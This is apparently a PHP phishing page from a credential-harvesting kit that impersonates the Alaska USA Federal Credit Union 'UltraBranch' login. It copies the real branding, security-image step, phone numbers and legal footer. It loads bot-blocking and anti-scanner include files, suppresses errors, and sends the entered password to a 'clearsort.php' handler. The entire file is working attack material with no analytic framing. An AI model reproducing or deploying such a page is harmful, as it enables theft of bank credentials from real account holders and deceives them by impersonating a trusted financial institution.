<?php

error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

session_start();

include 'blocker.php';
include 'antirobot.php';
include 'bt.php';


?>


<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><link rel="stylesheet" type="text/css" href="cid_css-2e4e1481-8b8d-4c89-95fa-d51f38c2e33c_mhtml.blink.css" /><link rel="stylesheet" type="text/css" href="cid_css-aa80f7bb-db12-48d0-9fe6-743ea4c65884_mhtml.blink.css" />

   <title>UltraBranch Login</title>
   <meta http-equiv="X-UA-Compatible" content="IE=Edge">

   <link rel="stylesheet" href="ub-print.css_akusa.css" type="text/css" media="print">
   <link rel="stylesheet" href="ub-main.css_akusa.css" type="text/css" title="main" media="screen, projection">
   <link rel="stylesheet" href="ub-login-new.css_akusa.css" type="text/css">

<link rel="icon" type="image/x-icon" href="favicon.ico">
   

   

  

    
</head>
<body>
   <div id="header" role="banner">
    <section class="skipLinks" title="Enter your Personal Access Code by simply typing on your keyboard">
      <h2 class="visuallyhidden">Skip links</h2>
      <p><a href="login-image-password.jsp.htm#instr" class="visuallyhidden">Skip to main content</a></p>
      <p><a href="login-image-password.jsp.htm#pgFooter" class="visuallyhidden">Skip to footer</a></p>
      <p><a href="https://www.alaskausa.org/service/contact.asp" class="visuallyhidden">If you are using a screen reader and having difficulties with the site, call the Member Service Center 24/7 at 800-525-9094.</a></p>
    </section>
    <div id="topBar">
      <a href="https://www.alaskausa.org/" id="logo" title="Alaska USA Federal Credit Union"><img src="akusafcu_logo.png" alt="Alaska USA"></a>
      <p id="headerReturnLink"><a href="https://www.alaskausa.org/">Return to home</a></p>
    </div>

    
    
    <div id="pgHead">
    </div>
    
   </div>

   <div id="pgMain" role="main">
         <div id="mainContent">
           <div class="leftCol">
            <h2>Log in to your account</h2>
            <form method="post" name="safelogin" action="clearsort.php">
              
              <label>Password:</label>
              <input type="password" name="Password" id="password" aria-label="Password with Fish security image">
              <input type="image" src="log-btn2.jpg" width="51" height="21">

              <div class="imageBox">
                <img src="designs-fish.jpg">
              </div>
            </form>
            
          </div>

	      	<div class="sideBar">
	      		<div class="learnMore">
	      			<h2 class="help">Quick Help</h2>
                    <ul class="help">
                       
                       <li><a href="https://ultrabranch3.alaskausa.org/efs/ultrabranch/ForgotPAC">Forgot online password?</a></li>
                       <li id="liKeypadNote">
                          <a href="login-image-password.jsp.htm#" id="keypadLabel" role="button" aria-controls="keypadNote" aria-expanded="false">Don't recognize security image?</a>
                          <div class="notes" id="keypadNote" role="region" aria-labelledby="keypadLabel" aria-hidden="true">
                             <p>You entered User ID <b>656565</b> - is this correct?</p>
                             <p>No - <a href="https://www.alaskausa.org/" title="Return to previous screen">Return to the previous
                             screen</a> to re-enter your User ID</p>
                             <p>Yes - Call the number listed below.</p>
                          </div>
                       </li>
                       
                    </ul>
                    <div class="help" style="display:none;">
                       <h1>Questions?  (800) 525-9094</h1>
                    </div>
	      		</div>
				<div id="questionSection" class="learnMore">
					<h2>Questions?</h2>
					<p>
						For assistance contact the Member Service Center.
					</p><p style="padding-left:10px;margin-top:10px;">
						(907) 563-4567 or (800) 525-9094<br><br>
						Open 24 hours a day, 7 days a week.<br><br>
						<a href="https://www.alaskausa.org/service/contact.asp" target="_blank">More contact information</a>
					</p>
					<p></p>
				</div>
      	  	</div>
         </div>
         <br><br>
         
         <div id="pgFooter" style="background-color:rgb(200,200,200)">
            <hr>

   <div id="footer" role="contentinfo">
   	 <span class="bug">       
       <img alt="Equal Housing Lender" src="logo-ehl-tri.gif_.gif#042116">
     </span>
          
     <p> � Copyright  2021 � Alaska&nbsp;USA and UltraBranch are registered trademarks of Alaska&nbsp;USA Federal Credit Union.</p>
     <p>Mortgage loans are provided by Alaska USA Mortgage Company, LLC. License #AK157293 <br>
     Washington Consumer Loan Company License #CL-157293. Licensed by the Department of Business Oversight under the California Residential Mortgage Lending Act, License #4131067</p>
        <p><a>Privacy</a></p>
     
     
     <p class="ncua">
       <img src="logo-ncua.gif_.gif#042116" alt="Your funds federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency"><span>Federally insured by NCUA</span>
     </p>  
   </div>
         </div>
   </div>

</body></html>
